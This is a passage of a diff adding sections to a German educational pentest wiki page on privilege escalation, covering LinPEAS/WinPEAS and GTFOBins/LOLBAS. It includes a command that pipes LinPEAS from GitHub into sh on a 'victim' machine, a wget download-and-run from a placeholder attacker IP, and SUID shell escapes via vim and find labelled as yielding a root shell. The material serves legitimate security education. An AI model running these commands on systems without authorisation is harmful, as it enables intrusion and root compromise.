+          <span class="severity sev-high">● POST-EXPLOIT</span>
+          <p class="sub-desc">
+            Automatische Suche nach Privilege Escalation Vektoren. LinPEAS für Linux, WinPEAS für Windows. Prüft hunderte mögliche Wege um von normalem User zu Root/SYSTEM zu kommen.
+          </p>
+          <pre><span class="hl-comment"># Direkt von GitHub ausführen (auf Opfer-Maschine)</span>
+<span class="hl-func">curl</span> -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<span class="hl-comment"># Oder: auf eigener Maschine hosten + auf Opfer laden</span>
+<span class="hl-comment"># [Angreifer] HTTP-Server starten:</span>
+<span class="hl-func">python3</span> -m http.server <span class="hl-num">8080</span>
+
+<span class="hl-comment"># [Opfer] Datei herunterladen und ausführen:</span>
+<span class="hl-func">wget</span> http://ANGREIFER-IP:8080/linpeas.sh -O /tmp/linpeas.sh
+<span class="hl-func">chmod</span> +x /tmp/linpeas.sh && /tmp/linpeas.sh
+
+<span class="hl-comment"># Output in Datei speichern</span>
+/tmp/linpeas.sh | tee /tmp/output.txt</pre>
+          <div class="defense-block">
+            <h4>📝 Was LinPEAS prüft</h4>
+            <ul>
+              <li>SUID/SGID-Binaries (oft Privilege Escalation möglich)</li>
+              <li>Sudo-Berechtigungen (sudo -l)</li>
+              <li>Cron-Jobs (beschreibbare Scripts die als Root laufen)</li>
+              <li>Schwache Dateirechte (/etc/passwd, /etc/shadow)</li>
+              <li>Credentials in Konfig-Dateien, Historys, Umgebungsvariablen</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- GTFOBins -->
+      <div class="subcategory">
+        <div class="sub-header">
+          <div class="sub-icon" style="background:rgba(204,255,68,0.08)">📖</div>
+          <span class="sub-title">GTFOBins & LOLBAS — Privilege Escalation Referenz</span>
+          <span class="sub-arrow">▶</span>
+        </div>
+        <div class="sub-content">
+          <span class="severity sev-high">● REFERENZ</span>
+          <p class="sub-desc">
+            Keine Tools, sondern Wissensdatenbanken. GTFOBins (Linux) und LOLBAS (Windows) listen auf, welche System-Binaries für Privilege Escalation, Shell-Escapes und Dateioperationen missbraucht werden können.
+          </p>
+          <pre><span class="hl-comment"># SUID-Binaries auf dem System finden:</span>
+<span class="hl-func">find</span> / -perm -u=s -type f 2>/dev/null
+
+<span class="hl-comment"># Beispiel: vim hat SUID-Bit gesetzt</span>
+<span class="hl-comment"># → GTFOBins nachschlagen → vim kann Shell spawnen:</span>
+<span class="hl-func">vim</span> -c ':!/bin/sh'
+<span class="hl-good">→ Root-Shell!</span>
+
+<span class="hl-comment"># Beispiel: find hat SUID-Bit</span>
+<span class="hl-func">find</span> . -exec /bin/sh \; -quit
+<span class="hl-good">→ Root-Shell!</span></pre>
+          <div class="defense-block">
+            <h4>🔗 Ressourcen</h4>
+            <ul>
+              <li>GTFOBins: gtfobins.github.io — Linux SUID / Sudo / Shell escape</li>
+              <li>LOLBAS: lolbas-project.github.io — Windows Living off the Land</li>
+              <li>HackTricks: book.hacktricks.xyz — umfassendes Pentest-Wiki</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+    <div style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted);text-align:center;margin-bottom:16px">Seite erstellt von <a href="https://github.com/AimonKied" target="_blank" rel="noopener" style="color:var(--muted);text-decoration:underline dotted">AimonKied</a></div>
+    <p style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted);text-align:center;padding-bottom:60px">
+      // wiki.simonwied.com · CyberTools · Für Bildungszwecke · <span id="siteVersion"></span>
+    </p>
+  </main>
+</div>
+
+</body>
+</html>
